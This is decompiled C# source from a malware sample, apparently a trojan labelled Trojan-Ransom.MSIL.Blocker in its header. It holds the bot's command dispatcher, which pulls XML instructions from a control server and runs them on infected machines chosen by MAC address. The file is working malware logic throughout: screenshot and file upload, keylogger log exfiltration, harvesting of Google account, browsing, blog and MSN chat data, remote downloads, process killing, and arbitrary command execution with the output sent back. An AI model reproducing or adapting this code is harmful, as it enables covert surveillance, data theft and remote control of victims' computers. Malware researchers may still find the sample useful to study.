// Decompiled with JetBrains decompiler
// Type: flu.XMLReader
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-95e0689d187b08f029efa892400fba3cceb7785a02a7c89bae7ec0db19434304.exe

using System;
using System.Xml;

namespace flu
{
  internal class XMLReader
  {
    private XmlDocument xDoc;
    private int version;

    public XMLReader() => this.xDoc = new XmlDocument();

    public void GetXML()
    {
      try
      {
        this.xDoc.Load(Network.XML);
      }
      catch
      {
        System.Console.WriteLine("No hay servidor web en el otro lado");
      }
    }

    public void ExecuteXML()
    {
      foreach (XmlNode xmlNode1 in (XmlNode) this.xDoc.DocumentElement)
      {
        if (xmlNode1.Name.Equals("version"))
        {
          int int32 = Convert.ToInt32(xmlNode1.Attributes[0].Value);
          if (int32 <= this.version)
          {
            System.Console.WriteLine("version no superada");
          }
          else
          {
            this.version = int32;
            foreach (XmlNode xmlNode2 in this.xDoc.GetElementsByTagName("instruction"))
            {
              try
              {
                if (!xmlNode2.Attributes[3].Value.Contains(Network.MAC))
                {
                  if (!xmlNode2.Attributes[3].Value.Equals("all"))
                    continue;
                }
                switch (xmlNode2.Attributes[0].Value.ToUpper())
                {
                  case "WALLPAPER":
                    OS.ChangeWallpaper(Network.DownloadFile(xmlNode2.Attributes[1].Value));
                    continue;
                  case "SNAPSHOT":
                    Network.SendImage();
                    continue;
                  case "GETFILE":
                    Network.SendFile(xmlNode2.Attributes[1].Value, xmlNode2.Attributes[0].Value, xmlNode2.Attributes[2].Value);
                    continue;
                  case "GETKEYLOGGER":
                    Network.SendFile(OS.getKeyValue("win32").Replace(".exe", ".txt"), xmlNode2.Attributes[0].Value, xmlNode2.Attributes[2].Value);
                    continue;
                  case "SENDMAIL":
                    string[] strArray = xmlNode2.Attributes[1].Value.ToString().Split('|');
                    new Mail(strArray[2], strArray[0], strArray[1], strArray[4], strArray[3], strArray[5], strArray[6]).sendMail(int.Parse(strArray[7]));
                    continue;
                  case "KILLPROCESS":
                    OS.KillProcess(xmlNode2.Attributes[1].Value);
                    continue;
                  case "PLAYAUDIO":
                    OS.PlayAudio(xmlNode2.Attributes[1].Value);
                    continue;
                  case "DOWNLOADFILE":
                    Network.DownloadFile(xmlNode2.Attributes[1].Value);
                    continue;
                  case "GETREGISTERS":
                    string info = string.Empty;
                    try
                    {
                      foreach (string str in OS.getGoogleAccount())
                        info = info + str + "<br/>";
                    }
                    catch
                    {
                    }
                    finally
                    {
                      info += "<br/>";
                    }
                    try
                    {
                      foreach (string str in OS.getMoviesMade())
                        info = info + str + "<br/>";
                    }
                    catch
                    {
                    }
                    finally
                    {
                      info += "<br/>";
                    }
                    try
                    {
                      foreach (string explorerTypedUrl in OS.getInternetExplorerTypedUrls())
                        info = info + explorerTypedUrl + "<br/>";
                    }
                    catch
                    {
                    }
                    finally
                    {
                      info += "<br/>";
                    }
                    try
                    {
                      foreach (string blog in OS.getBlogs())
                        info = info + blog + "<br/>";
                    }
                    catch
                    {
                    }
                    finally
                    {
                      info += "<br/>";
                    }
                    try
                    {
                      foreach (string msnTalk in OS.getMsnTalks())
                        info = info + msnTalk + "<br/>";
                    }
                    catch
                    {
                    }
                    finally
                    {
                      info += "<br/>";
                    }
                    Network.SendInformation(info, xmlNode2.Attributes[0].Value.ToString(), xmlNode2.Attributes[2].Value.ToString(), 1);
                    continue;
                  default:
                    Console.ExecuteAndSend(xmlNode2.Attributes[0].Value, xmlNode2.Attributes[1].Value, xmlNode2.Attributes[2].Value);
                    continue;
                }
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
